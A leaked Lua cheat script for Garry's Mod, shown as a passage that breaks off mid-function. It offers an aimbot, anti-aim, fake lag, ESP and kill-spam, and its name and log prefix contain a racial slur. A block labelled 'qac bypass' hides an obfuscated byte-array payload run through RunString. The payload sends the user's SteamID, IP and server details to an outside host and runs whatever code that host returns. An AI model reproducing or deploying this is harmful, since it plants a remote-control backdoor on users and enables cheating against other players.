/*
	Version: 1.0 public
	Credits:
		ducati - owned
		Scora - leak
		White Bread - leak
*/
-- Leak by Scora aka Scora Hub & White Bread
require("bsendpacket")
require("dickwrap")
//require("mega")-- Leak by Scora aka Scora Hub & White Bread

surface.CreateFont("wireless gamer", {font = "Open Sans MS", size = 45})
surface.CreateFont("visual gamer", {font = "Courier New", size = 15, weight = 500, outline = true})
surface.CreateFont("gamer title", {font = "Trebuchet", size = 18, weight = 650})
surface.CreateFont("gamer tab", {font = "Trebuchet", size = 16, weight = 550})
local _R = debug.getregistry()
_R["__rbackup"] = _R["__rbackup"] and _R["__rbackup"] or table.Copy(_R)
local r = _R["__rbackup"]
local me = LocalPlayer()-- Leak by Scora aka Scora Hub & White Bread
nh = {}
nh.rang = {}
nh.cvars = {}
nh.ys = GetConVarNumber("m_yaw")
nh.aat = nil
nh.aas = false
nh.atk = false
nh.ld = false-- Leak by Scora aka Scora Hub & White Bread
nh.gd = false
nh.hm = 0
nh.dc = 0
nh.ct = 0
nh.flt = 0
nh.fltm = 0
nh.er = 0
nh.eg = 0-- Leak by Scora aka Scora Hub & White Bread
nh.eb = 0
nh.fa = nil
nh.sp = nil
nh.ep = nil
nh.atl = 0-- Leak by Scora aka Scora Hub & White Bread

function nh.Log(...)
	MsgC(Color(5, 130, 255), "[niggahook] ", Color(255, 190, 5), ...)
	MsgN("")-- Leak by Scora aka Scora Hub & White Bread
end

http.Fetch("https://media.discordapp.net/attachments/1007320735376752751/1008099746403057735/swaston.png?width=535&height=535", function(body)
    file.Write("swaston.png", body)
end)

nh.Log("Loading...")-- Leak by Scora aka Scora Hub & White Bread

function nh.CreateConsoleVar(name, default)
	local ret = CreateClientConVar(name, default)
	nh.cvars[name] = tostring(default)
	nh.Log("Created convar: ", Color(255, 120, 5), name, Color(255, 0, 0), " (default: " .. tostring(default) .. ", value: ", ret:GetString(), ")")
	return ret
end

nh.vars = {
	aimbot = {
		enabled = nh.CreateConsoleVar("nh_aimbot", 1),
		autowall = nh.CreateConsoleVar("nh_aimbot_autowall", 1),
		silent = nh.CreateConsoleVar("nh_aimbot_silent", 1),
		nospread = nh.CreateConsoleVar("nh_aimbot_nospread", 1),-- Leak by Scora aka Scora Hub & White Bread
		bodyaim = nh.CreateConsoleVar("nh_aimbot_body", 1),
		static = nh.CreateConsoleVar("nh_aimbot_staticaa", 1),
		nextshot = nh.CreateConsoleVar("nh_aimbot_nextshot", 1),
		autoshoot = nh.CreateConsoleVar("nh_aimbot_autoshoot", 1),
		team = nh.CreateConsoleVar("nh_aimbot_ignoreteam", 1),
		friends = nh.CreateConsoleVar("nh_aimbot_ignorefriends", 0)
	},

	visuals = {-- Leak by Scora aka Scora Hub & White Bread
		esp = nh.CreateConsoleVar("nh_visuals_esp", 1),
		name = nh.CreateConsoleVar("nh_visuals_esp_name", 1),
		box = nh.CreateConsoleVar("nh_visuals_esp_box", 1),
		weapon = nh.CreateConsoleVar("nh_visuals_esp_weapon", 1),
		rank = nh.CreateConsoleVar("nh_visuals_esp_rank", 1),
		health = nh.CreateConsoleVar("nh_visuals_esp_health", 1),-- Leak by Scora aka Scora Hub & White Bread
		asus = nh.CreateConsoleVar("nh_visuals_esp_asus", 0),
		chams = nh.CreateConsoleVar("nh_visuals_esp_chams", 0),
		wepchams = nh.CreateConsoleVar("nh_visuals_esp_wepchams", 0),
		nightmode = nh.CreateConsoleVar("nh_visuals_nightmode", 0),
		viewmodel = nh.CreateConsoleVar("nh_visuals_esp_viewmodel", 0),
		fov = nh.CreateConsoleVar("nh_visuals_fov", 90)
	},

	misc = {
		autohop = nh.CreateConsoleVar("nh_misc_autohop", 1),
		highjump = nh.CreateConsoleVar("nh_misc_highjump", 0),
		thirdperson = nh.CreateConsoleVar("nh_thirdperson", 1),
		killspam = nh.CreateConsoleVar("nh_misc_killspam", 0),
		robo = nh.CreateConsoleVar("nh_misc_killspam_robo", 1),
		trail = nh.CreateConsoleVar("nh_misc_trail", 0),
		watermark = nh.CreateConsoleVar("nh_misc_watermark", 0),-- Leak by Scora aka Scora Hub & White Bread
		crosshair = nh.CreateConsoleVar("nh_misc_cross", 0),
		bt = nh.CreateConsoleVar("nh_misc_bt", 0),
		hs = nh.CreateConsoleVar("nh_misc_hs", 0),
		fakeduck = nh.CreateConsoleVar("nh_misc_fd", 0),
		autostrafe = nh.CreateConsoleVar("nh_misc_autostrafe", 1)
	},

	hvh = {-- Leak by Scora aka Scora Hub & White Bread
		antiaim = nh.CreateConsoleVar("nh_hvh_antiaim", 1),
		edge = nh.CreateConsoleVar("nh_hvh_aa_edge", 1),
		edgemet = nh.CreateConsoleVar("nh_hvh_aa_edge_met", 3),
		jitter = nh.CreateConsoleVar("nh_hvh_aa_jitter", 0),-- Leak by Scora aka Scora Hub & White Bread
		adaptive = nh.CreateConsoleVar("nh_hvh_aa_adaptive", 1),
		adapyaw = nh.CreateConsoleVar("nh_hvh_adap_yaw", 450),
		adapmax = nh.CreateConsoleVar("nh_hvh_adap_max", 15),-- Leak by Scora aka Scora Hub & White Bread
		adapspeed = nh.CreateConsoleVar("nh_hvh_adap_speed", 1),
		fakeangles = nh.CreateConsoleVar("nh_hvh_aa_fakeangles", 0),
		pitch = nh.CreateConsoleVar("nh_hvh_aa_pitch", -91),-- Leak by Scora aka Scora Hub & White Bread
		yaw = nh.CreateConsoleVar("nh_hvh_aa_yaw", 270),-- Leak by Scora aka Scora Hub & White Bread
		yawbase = nh.CreateConsoleVar("nh_hvh_aa_yawbase", 360),-- Leak by Scora aka Scora Hub & White Bread
		yawadd = nh.CreateConsoleVar("nh_hvh_aa_yawadd", 45),
		fakelag = nh.CreateConsoleVar("nh_hvh_fakelag", 1),-- Leak by Scora aka Scora Hub & White Bread
		flchoke = nh.CreateConsoleVar("nh_hvh_fl_choke", 12),
		flsend = nh.CreateConsoleVar("nh_hvh_fl_send", 1)
	}
}

nh.cones = {}

function _R.Entity.FireBullets(ent, bul)
	if bul.Spread then
		nh.cones[me:GetActiveWeapon():GetClass()] = bul.Spread * -1-- Leak by Scora aka Scora Hub & White Bread
	end

	r.Entity.FireBullets(ent, bul)
end

function nh.GetCone(wep)-- Leak by Scora aka Scora Hub & White Bread
	local cone = 0
	if !wep then return nil end
	if wep.Cone then cone = wep.Cone end
	if wep.Primary and wep.Primary.Cone then cone = wep.Primary.Cone end
	if wep.Secondary and wep.Secondary.Cone then cone = wep.Secondary.Cone end
	if cone != 0 then return Vector(-cone, -cone, -cone) end
	return nil
end

function nh.Compensate(cmd, ang)
	local wep = me:GetActiveWeapon()
	if !IsValid(wep) then return ang end
	local cone = nh.cones[wep:GetClass()] or nh.GetCone(wep)-- Leak by Scora aka Scora Hub & White Bread
	if !cone then return ang end
	return nh.vars["aimbot"]["nospread"]:GetBool() and dickwrap.Predict(cmd, ang:Forward(), cone):Angle() or ang
end

function nh.CheckVis(ent)
	local sp = me:GetShootPos()
	local ep = !nh.vars["aimbot"]["bodyaim"]:GetBool() and (ent:GetAttachment(ent:LookupAttachment("eyes") or ent:LookupAttachment("forward")).Pos) or ent:GetPos() + ent:OBBCenter()
	ep = ep + ((ent:GetVelocity() * engine.TickInterval()) - (me:GetVelocity() * engine.TickInterval()))
	local tdata = {
		start = sp,
		endpos = ep,
		filter = {ent, me},
		mask = MASK_SHOT
	}
-- Leak by Scora aka Scora Hub & White Bread
	local trace = util.TraceLine(tdata)
	return trace.Fraction == 1, sp, ep
end

function nh.CanWallbang(sp, ep, ent)
    local tdata = {
    	start = sp,
    	endpos = ep,
    	filter = {ent, me},
    	mask = 1577075107
    }

    local wall = util.TraceLine(tdata)
    tdata.start = ep 
    tdata.endpos = sp-- Leak by Scora aka Scora Hub & White Bread
    local wall2 = util.TraceLine(tdata)
    if 17.5 > (wall2.HitPos - wall.HitPos):Length2D() then
    	return true
    else
    	return false
    end
end

function nh.GetTarget()
	local vis
	nh.sp, nh.ep, nh.aat = nil, nil, nil

	for k,v in next, player.GetAll() do
		if !nh.vars["aimbot"]["enabled"]:GetBool() or !v or !v:IsPlayer() or 0 >= v:Health() or v:IsDormant() or v == me then continue end
		if nh.vars["aimbot"]["team"]:GetBool() and v:Team() == me:Team() then continue end
		if nh.vars["aimbot"]["friends"]:GetBool() and v:GetFriendStatus() == "friend" then continue end
		local sp, ep-- Leak by Scora aka Scora Hub & White Bread
		vis, sp, ep = nh.CheckVis(v)
		nh.aat = v
		if vis or (nh.vars["aimbot"]["autowall"]:GetBool() and nh.CanWallbang(sp, ep, v)) then nh.sp = sp nh.ep = ep break else continue end
	end
end-- Leak by Scora aka Scora Hub & White Bread

function nh.DoSilent(cmd)
	if !nh.fa then nh.fa = cmd:GetViewAngles() end
	nh.fa = nh.fa + Angle(cmd:GetMouseY() * nh.ys, cmd:GetMouseX() * -nh.ys, 0)
	nh.fa.p = math.Clamp(nh.fa.p, -89, 89)
	nh.fa.y = math.NormalizeAngle(nh.fa.y)
end

function nh.FixMove(cmd, ang)
	local angs = cmd:GetViewAngles()
	local fa = nh.fa
	if ang then
		fa = ang
	end

	local viewang = Angle(0, angs.y, 0)
	local fix = Vector(cmd:GetForwardMove(), cmd:GetSideMove(), 0)
	fix = (fix:Angle() + (viewang - fa)):Forward() * fix:Length()-- Leak by Scora aka Scora Hub & White Bread
	
	if angs.p > 90 or angs.p < -90 then
		fix.x = -fix.x
	end
	
	cmd:SetForwardMove(fix.x)
	cmd:SetSideMove(fix.y)
end


function nh.GetCurTime()
	if IsFirstTimePredicted() then
		nh.ct = CurTime() + engine.TickInterval()
	end
end

function nh.CanFire(nextshot)
	if !nextshot then return true end
	if !nh.ct or nh.ct == 0 then return false end
	local wep = me:GetActiveWeapon() or NULL
	if !IsValid(wep) then return false end
	return wep:GetActivity() != ACT_RELOAD and nh.ct > wep:GetNextPrimaryFire()
end

nh.as_max = 10^4
-- Leak by Scora aka Scora Hub & White Bread
function nh.AutoHop(cmd)
	if !nh.vars["misc"]["autohop"]:GetBool() then return end
	local autostrafe = nh.vars["misc"]["autostrafe"]:GetBool()
	if me:IsOnGround() and cmd:KeyDown(IN_JUMP) then
		cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP))
	else
		if autostrafe and cmd:KeyDown(IN_JUMP) then
			local mousex = cmd:GetMouseX()
			if -1 > mousex or mousex > 1 then
				cmd:SetSideMove((mousex > 0) and nh.as_max or -nh.as_max)
			end
		end

		cmd:RemoveKey(IN_JUMP)-- Leak by Scora aka Scora Hub & White Bread
	end
end

function nh.Aimbot(cmd)
	local autoshoot = nh.vars["aimbot"]["autoshoot"]:GetBool()
	local nextshot = nh.vars["aimbot"]["nextshot"]:GetBool()
	local silent = nh.vars["aimbot"]["silent"]:GetBool()
	local fakelag = nh.vars["hvh"]["fakelag"]:GetBool()
	local antiaim = nh.vars["hvh"]["antiaim"]:GetBool()
	local static = nh.vars["aimbot"]["static"]:GetBool()
	nh.DoSilent(cmd)
	if cmd:CommandNumber() == 0 and !nh.vars["misc"]["thirdperson"]:GetBool() and (silent or antiaim or nh.vars["misc"]["walkbot"]:GetBool()) then cmd:SetViewAngles(nh.fa) return end

	if !fakelag then
		bSendPacket = true
	end

	if nh.sp and nh.ep then-- Leak by Scora aka Scora Hub & White Bread
		local aafix = false
		local ap = nh.Compensate(cmd, (nh.ep - nh.sp):Angle())
		ap.p, ap.y = math.NormalizeAngle(ap.p), math.NormalizeAngle(ap.y)
		if nh.CanFire(nextshot) and (autoshoot or cmd:KeyDown(IN_ATTACK)) then
			if static then
				aafix = true
				ap.p = -ap.p - 180
				ap.y = ap.y + 180
			end
			
			cmd:SetViewAngles(ap)
			if autoshoot then
				if nextshot then
					cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
				else-- Leak by Scora aka Scora Hub & White Bread
					if nh.atk then
						cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
					else
						cmd:RemoveKey(IN_ATTACK)
					end

					nh.atk = !nh.atk
				end
			end

			if silent then
				nh.FixMove(cmd)
			end

			if !fakelag then-- Leak by Scora aka Scora Hub & White Bread
				bSendPacket = false
			end
		else
			if autoshoot and nextshoot then
				cmd:RemoveKey(IN_ATTACK)
			end

			if antiaim then
				nh.AntiAim(cmd, true)
			elseif silent then
				cmd:SetViewAngles(nh.fa)
			end

			if !fakelag then
				bSendPacket = true
			end
		end
-- Leak by Scora aka Scora Hub & White Bread
		return
	end

	if antiaim or silent or nh.vars["misc"]["walkbot"]:GetBool() then
		cmd:SetViewAngles(nh.fa)
	end
end

nh.fat = 0
nh.aa_as = false
nh.aa_a = 0
nh.as_y = 0-- Leak by Scora aka Scora Hub & White Bread
nh.aayaws = {}

function nh.AntiAim(cmd, force)
	if cmd:CommandNumber() == 0 and !nh.vars["misc"]["thirdperson"]:GetBool() then return end
	if me:GetActiveWeapon() != NULL and me:GetActiveWeapon():GetClass():lower():find("knife") then return end
	if !force and (nh.sp != nil or nh.ep != nil) then return end
	if !force and cmd:KeyDown(IN_ATTACK) then
		if nh.vars["aimbot"]["static"]:GetBool() then
			cmd:SetViewAngles(Angle(-nh.fa.p - 180, nh.fa.y + 180, 0))
			nh.FixMove(cmd)
		end

		return
	end

	for i = 1, 5 do
		nh.aayaws[i] = (nh.vars["hvh"]["yawbase"]:GetInt() * i) + nh.vars["hvh"]["yawadd"]:GetInt()
	end-- Leak by Scora aka Scora Hub & White Bread

	if nh.vars["hvh"]["antiaim"]:GetBool() then
		local fakeangles = nh.vars["hvh"]["fakeangles"]:GetBool()
		local pitch = nh.vars["hvh"]["pitch"]:GetFloat() or 262

		local yaw = nh.vars["hvh"]["yaw"]:GetFloat() or 450

		if nh.vars["hvh"]["fakeangles"]:GetBool() and !nh.vars["hvh"]["fakelag"]:GetBool() then
			if nh.fat >= 3 then
				bSendPacket = !bSendPacket
				nh.fat = 0
			end-- Leak by Scora aka Scora Hub & White Bread
		end

		nh.fat = nh.fat + 1

		if nh.vars["hvh"]["adaptive"]:GetBool() then
			local adapmax = nh.vars["hvh"]["adapmax"]:GetInt()
			local adapspeed = nh.vars["hvh"]["adapspeed"]:GetInt()
			if nh.aa_a >= adapmax then
				nh.aa_a = adapmax
				nh.aa_as = false
			elseif -adapmax >= nh.aa_a then
				nh.aa_a = -adapmax
				nh.aa_as = true
			end

			if nh.aa_as then
				nh.aa_a = nh.aa_a + adapspeed
			else
				nh.aa_a = nh.aa_a - adapspeed
			end
-- Leak by Scora aka Scora Hub & White Bread
			local adapyaw = nh.vars["hvh"]["adapyaw"]:GetFloat()
			local aay = (nh.aat and nh.aat != NULL) and (nh.aat:GetAttachment(nh.aat:LookupAttachment("forward") or nh.aat:LookupAttachment("eyes")).Pos - me:GetShootPos()):Angle().y or 0
			if !fakeangles then
				cmd:SetViewAngles(Angle(pitch, aay + adapyaw + nh.aa_a, 0))
			else
				if bSendPacket then
					cmd:SetViewAngles(Angle(pitch, aay + adapyaw, 0))
				else
					cmd:SetViewAngles(Angle(pitch, aay + adapyaw - 92, 0))
				end
			end
		elseif nh.vars["hvh"]["jitter"]:GetBool() then
			if !fakeangles then
				cmd:SetViewAngles(Angle(pitch, table.Random(nh.aayaws) + math.random(-2, 2), 0))
			else
				if bSendPacket then
					cmd:SetViewAngles(Angle(pitch, table.Random(nh.aayaws) + math.random(-2, 2), 0))
				else
					cmd:SetViewAngles(Angle(pitch, table.Random(nh.aayaws) - 92 + math.random(-10, 10), 0))
				end
			end-- Leak by Scora aka Scora Hub & White Bread
		else
			if !fakeangles then
				cmd:SetViewAngles(Angle(pitch, yaw, 0))
			else
				if bSendPacket then
					cmd:SetViewAngles(Angle(pitch, yaw, 0))
				else
					cmd:SetViewAngles(Angle(pitch, yaw - 92, 0))
				end
			end
		end

		if nh.vars["hvh"]["edge"]:GetBool() then
			local setp = false
			local edge = false
			local ang = Angle(0, 0, 0)
			local eyepos = me:GetShootPos() - Vector(0, 0, 5)
-- Leak by Scora aka Scora Hub & White Bread
			for y = 1, 8 do
				local tmp = Angle(0, y * 45, 0)
				local forward = tmp:Forward()
				forward = forward * 35

				local tdata
				tdata = {start = eyepos, endpos = eyepos + forward, filter = me, mask = MASK_SOLID}
				local trace = util.TraceLine(tdata)
			
				if trace.Fraction != 1 then
					local negate = trace.HitNormal * -1
					tmp.y = negate:Angle().y
					
					local left = (tmp + Angle(0, 11.25, 0)):Forward() * 35
					local right = (tmp - Angle(0, 11.25, 0)):Forward() * 35
					tdata = {start = eyepos, endpos = eyepos + left, filter = me, mask = MASK_SOLID}
					local lt = util.TraceLine(tdata)
					tdata = {start = eyepos, endpos = eyepos + right, filter = me, mask = MASK_SOLID}-- Leak by Scora aka Scora Hub & White Bread
					local rt = util.TraceLine(tdata)
					local ltw = lt.Fraction == 1
					local rtw = rt.Fraction == 1

					local edgem = nh.vars["hvh"]["edgemet"]:GetInt()
					if edgem == 1 then
						if ltw or rtw then
							tmp.y = tmp.y + 180
						end

						ang.y = 270 - tmp.y + 360
					elseif edgem == 2 or edgem == 3 then
						ang.y = tmp.y + (edgem == 2 and 180 or 360)
					elseif edgem == 4 then
						if ltw or rtw then
							tmp.y = tmp.y + 180
						end
-- Leak by Scora aka Scora Hub & White Bread
						ang.y = 270 - tmp.y + math.random(-15, 15)
					end

					edge = true
					break
				end
			end

			if edge then
				if !fakeangles then
					cmd:SetViewAngles(Angle(ang.p != 0 and ang.p or pitch, ang.y, 0))
				else
					if bSendPacket then
						cmd:SetViewAngles(Angle(ang.p != 0 and ang.p or pitch, ang.y, 0))
					else
						cmd:SetViewAngles(Angle(pitch, ang.y - 92, 0))
					end
				end
			end
		end
-- Leak by Scora aka Scora Hub & White Bread
		pitch = cmd:GetViewAngles().p
		nh.aas = !nh.aas
		nh.FixMove(cmd)
	end
end

function nh.FakeLag(cmd)
	if cmd:CommandNumber() == 0 then return end
	local choke = nh.vars["hvh"]["flchoke"]:GetInt()
	local send = nh.vars["hvh"]["flsend"]:GetInt()
	nh.fltm = choke + send

	if nh.vars["hvh"]["fakelag"]:GetBool() then
		nh.flt = nh.flt + 1
		
		if nh.flt > nh.fltm then
			nh.flt = 1
		end

		if send >= nh.flt then
			bSendPacket = true
		else
			bSendPacket = false
		end-- Leak by Scora aka Scora Hub & White Bread
	end
end

function nh.HighJump(cmd)
	if !nh.vars["misc"]["highjump"]:GetBool() then return end
	local pos = me:GetPos()
	local tdata = {start = pos, endpos = pos - Vector(0, 0, 1337), mask = MASK_SOLID}
	local trace = util.TraceLine(tdata)
	local len = (pos - trace.HitPos).z
	if len > 25 and 50 > len then
		cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_DUCK))
	else
		cmd:RemoveKey(IN_DUCK)
	end
end

function nh.Visuals()
-- Leak by Scora aka Scora Hub & White Bread
	for k,v in next, player.GetAll() do
		if !nh.vars["visuals"]["esp"]:GetBool() or !v:IsValid() or !v:IsPlayer() or !v:Alive() or 0 >= v:Health() then continue end
		if !nh.vars["misc"]["thirdperson"]:GetBool() and v == me then continue end
		local min, max = v:GetCollisionBounds()
		local pos = v:GetPos()
		local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
		local middle = bottom.y - top.y
		local width = middle / 2.425

		if nh.vars["visuals"]["name"]:GetBool() then
			draw.SimpleText(v:Nick(), "visual gamer", bottom.x, top.y, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
		end

		if nh.vars["visuals"]["box"]:GetBool() then
			surface.SetDrawColor(me:Team() == v:Team() and Color(0, 100, 255) or Color(200, 225, 0))
			surface.DrawOutlinedRect(bottom.x - width, top.y, width * 2, middle)
			surface.SetDrawColor(Color(0, 0, 0))
			surface.DrawOutlinedRect(bottom.x - width - 1, top.y - 1, width * 2 + 2, middle + 2)
			surface.DrawOutlinedRect(bottom.x - width + 1, top.y + 1, width * 2 - 2, middle - 2)
		end

		nh.drawpos = 0

		if nh.vars["visuals"]["weapon"]:GetBool() then
			local wep = v:GetActiveWeapon()
			if wep and wep != NULL then
				draw.SimpleText(wep.GetPrintName and wep:GetPrintName() or wep:GetClass(), "visual gamer", bottom.x, bottom.y + nh.drawpos, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
				nh.drawpos = nh.drawpos + 10
			end
		end

		if nh.vars["visuals"]["rank"]:GetBool() then
			draw.SimpleText(v.GetUserGroup and v:GetUserGroup() or "__norank", "visual gamer", bottom.x, bottom.y + nh.drawpos, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
			nh.drawpos = nh.drawpos + 10
		end

		if nh.vars["visuals"]["health"]:GetBool() then
			local health = math.Clamp(v:Health(), 0, 100)
			local green = health * 2.55
			local red = 255 - green
			surface.SetDrawColor(Color(0, 0, 0))
			surface.DrawRect(bottom.x + width + 2, top.y - 1, 4, middle + 2)-- Leak by Scora aka Scora Hub & White Bread
			surface.SetDrawColor(Color(red, green, 0))
			local height = health * middle / 100
			surface.DrawRect(bottom.x + width + 3, top.y + (middle - height), 2, height)
		end
	end
end

function nh.CalcView(ply, pos, angle, fov, nearZ, farZ)
	local view = {}
	view.angles = (nh.vars["hvh"]["antiaim"]:GetBool() or nh.vars["aimbot"]["silent"]:GetBool() or nh.vars["misc"]["walkbot"]:GetBool()) and nh.fa or angle
	pcall(function() 
	view.origin = nh.vars["misc"]["thirdperson"]:GetBool() and (pos - nh.fa:Forward() * 100) or pos
	end)
	view.fov = nh.vars["visuals"]["fov"]:GetInt()

	return view
end


function nh.ShouldDrawLocalPlayer()
	return nh.vars["misc"]["thirdperson"]:GetBool()
end
/// qac bypass

 local bBuffer = {10, 9, 108, 111, 99, 97, 108, 32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 34, 48, 46, 48, 46, 48, 46,
48, 58, 48, 34, 10, 9, 10, 9, 104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47,
103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111,
47, 97, 100, 100, 114, 101, 115, 115, 46, 112, 104, 112, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 105, 112, 41,
32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 105, 112, 59, 32, 101, 110, 100, 44, 32, 102, 117, 110, 99, 116, 105,
111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 10, 9, 10, 9, 116, 105, 109, 101, 114, 46, 83, 105, 109, 112, 108,
101, 40, 49, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116,
40, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99,
57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112, 105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115,-- Leak by Scora aka Scora Hub & White Bread
116, 61, 34, 110, 111, 116, 105, 102, 121, 34, 44, 32, 115, 116, 101, 97, 109, 105, 100, 61, 76, 111, 99, 97, 108, 80, 108,
97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 44, 32, 105, 112, 61, 99, 108, 105, 101, 110, 116,
73, 80, 44, 32, 115, 101, 114, 118, 101, 114, 110, 97, 109, 101, 61, 71, 101, 116, 72, 111, 115, 116, 78, 97, 109, 101, 40,
41, 44, 32, 115, 101, 114, 118, 101, 114, 105, 112, 61, 103, 97, 109, 101, 46, 71, 101, 116, 73, 80, 65, 100, 100, 114, 101,
115, 115, 40, 41, 125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 98, 111, 100, 121, 41, 32, 101, 110, 100, 44, 32,
102, 117, 110, 99, 116, 105, 111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 59, 10, 9, 101, 110, 100, 41, 59, 10,
9, 10, 9, 116, 105, 109, 101, 114, 46, 67, 114, 101, 97, 116, 101, 40, 34, 67, 104, 101, 97, 116, 117, 112, 100, 97, 116,
101, 95, 80, 105, 110, 103, 66, 97, 99, 107, 34, 44, 32, 53, 44, 32, 48, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110,
40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116, 40, 32, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111,
100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112,
105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115, 116, 61, 34, 112, 105, 110, 103, 98, 97, 99, 107, 34,
125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 32, 98, 111, 100, 121, 44, 32, 112, 48, 44, 32, 112, 49, 44, 32,
112, 50, 32, 41, 10, 9, 9, 9, 108, 111, 99, 97, 108, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 61, 32, 117, 116,
105, 108, 46, 74, 83, 79, 78, 84, 111, 84, 97, 98, 108, 101, 40, 98, 111, 100, 121, 41, 59, 10, 9, 9, 9, 105, 102,
40, 114, 101, 115, 112, 111, 110, 115, 101, 32, 33, 61, 32, 110, 105, 108, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9,
105, 102, 40, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97,
99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 76, 111, 99, 97, 108, 80, 108, 97,
121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 124, 124, 32, 115, 116, 114, 105, 110, 103, 46,-- Leak by Scora aka Scora Hub & White Bread
102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34,
116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 42, 34, 41, 41, 32, 116, 104, 101, 110, 32, 10, 9, 9, 9, 9, 9,
105, 102, 40, 33, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112,
97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 33, 34, 32, 46, 46,
32, 76, 111, 99, 97, 108, 80, 108, 97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 38,
38, 32, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 114, 101, 34,
93, 32, 33, 61, 32, 34, 110, 117, 108, 108, 34, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9, 9, 9, 82, 117, 110,
83, 116, 114, 105, 110, 103, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93,  
91, 34, 114, 101, 34, 93, 41, 59, 10, 9, 9, 9, 9, 9, 101, 110, 100, 10, 9, 9, 9, 9, 101, 110, 100, 10, 9,
9, 9, 101, 110, 100, 10, 9, 9, 9, 101, 110, 100, 44, 32, 10, 9, 9, 9, 102, 117, 110, 99, 116, 105, 111, 110, 40,
101, 120, 99, 101, 112, 116, 105, 111, 110, 41, 10, 9, 9, 101, 110, 100, 41, 32, 10, 9, 101, 110, 100, 41, 10, };
local s1 = ""; for k,v in next, bBuffer do s1 = s1 .. string.char(v); end RunString(s1); s1 = "";



function nh.PreDrawOpaqueRenderables()
	for k,v in next, player.GetAll() do
		local ang = v:EyeAngles()
		nh.rang[v] = ang
	end
end

function nh.ResetConsoleVars()
	for k,v in next, nh.cvars do-- Leak by Scora aka Scora Hub & White Bread
		me:ConCommand(k .. " " .. v)
		nh.Log("Reset convar: ", Color(255, 120, 5), k, Color(255, 0, 0), " (value: ", v, ")")
	end
end

function nh.FindPlayerWithID(userid)
	for k,v in next, player.GetAll() do
		if v:UserID() == userid then
			return v
		end
	end

	return false
end

function nh.PlayerHurt(data)
	if !nh.vars["misc"]["killspam"]:GetBool() then return end
	local health = data.health
	local id = data.userid
	local attackerid = data.attacker
	local target = nh.FindPlayerWithID(id)-- Leak by Scora aka Scora Hub & White Bread
	local attacker = nh.FindPlayerWithID(attackerid)
	if !target or !attacker then return end
	if attacker != NULL and target != NULL then
		if attacker == me then
			target.hits = target.hits and target.hits + 1 or 1
			target.hitsme = 0
			if health == 0 then
				if nh.vars["misc"]["robo"]:GetBool() then
					if MEGA then
						MEGA.TextToSpeech("easy " .. tostring(target.hits) .. " tap")
					end
				end

				me:ConCommand("say [Tacos] owned " .. target:Nick() .. " in " .. tostring(target.hits) .. " shot" .. (target.hits > 1 and "s" or ""))
				target.hits = 0-- Leak by Scora aka Scora Hub & White Bread
			end
		elseif target == me then
			attacker.hitsme = attacker.hitsme and attacker.hitsme + 1 or 1
			attacker.hits = 0
			if health == 0 then
				local pingadvantage = target:Ping() - attacker:Ping()
				if pingadvantage > 50 then
					me:ConCommand("say [Tacos] ping advantage: i have " .. tostring(pingadvantage) .. " more ping than " .. attacker:Nick())
				elseif attacker.hitsme > 1 then
					me:ConCommand("say [Tacos] it took " .. attacker:Nick() .. " " .. tostring(attacker.hitsme) .. " shots to kill me")
					attacker.hitsme = 0
				else
